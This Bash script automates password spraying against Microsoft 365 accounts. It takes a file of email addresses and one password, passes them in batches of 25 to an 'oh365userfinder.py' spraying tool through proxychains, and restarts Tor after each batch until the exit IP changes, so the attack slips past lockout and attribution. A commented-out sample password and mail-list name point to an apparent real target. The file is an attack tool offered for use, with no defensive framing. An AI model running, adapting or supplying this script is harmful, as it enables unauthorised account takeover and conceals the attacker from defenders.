#!/bin/bash
#Modified by: Gustavo Segundo - ByteNull%00
#Credits: Joe Helle - Dievus
#Colours

endColour="\033[0m\e[0m"
blueColour="\e[0;34m\033[1m"


export DEBIAN_FRONTEND=noninteractive

trap ctrl_c INT

function ctrl_c(){
	service tor stop
	sleep 0.5
	echo -e "\n${yellowColour}[*]${endColour}${grayColour} Exit ...${endColour}"
	tput cnorm;
	exit 1
}

help(){
		namefile=$(basename "$0")
        echo -e "Usage: ${namefile} <MAIL_FILE> <PASSWORD>"
}



TMP_FILE="/tmp/tmp_mail.$$.tmp" #archivo con correos temporales
MAIL_FILE="$1"
PASSWORD="$2"
#MAIL_FILE=correos_total.txt	#archivo con todos los correos a probar
#PASSWORD='Peru2022$$'		    #contraseña a rociar

if [ -z "$MAIL_FILE" ]; then
        echo "Error: Provide me with a mail file"
        help
        exit 1
fi

if [ -z "$PASSWORD" ]; then
        echo "Error: Provide me with a password"
        help
        exit 2
fi

service tor start
		
sleep 3

ip1="$(proxychains curl https://ipecho.net/plain 2>/dev/null)"
echo -e "\n${blueColour}[*]${endColour} Mi dirección IP es {$ip1}"

ip2=""

while [ -s "$MAIL_FILE" ]; do
	#copiando las n primeras lineas al fichero temporal
	head -25 $MAIL_FILE | tee $TMP_FILE >/dev/null 2>&1
	#echo "------- borrando las n primeras lineas del fichero total"
	sed -i '1,25d' $MAIL_FILE

	proxychains python3 oh365userfinder.py -p $PASSWORD --pwspray --elist $TMP_FILE 2>/dev/null
	echo "" > $TMP_FILE

	service tor restart
	sleep 2
	ip2="$(proxychains curl https://ipecho.net/plain 2>/dev/null)"
	sleep 1
	while [ "$ip2" == "$ip1" ] || [ "$ip2" == "" ] ; do
		service tor restart
		sleep 2
		ip2="$(proxychains curl https://ipecho.net/plain 2>/dev/null)"
	done

	echo -e "\n${blueColour}[*]${endColour} Mi Nueva dirección IP es {$ip2}"


done

rm -rf $TMP_FILE
service tor stop
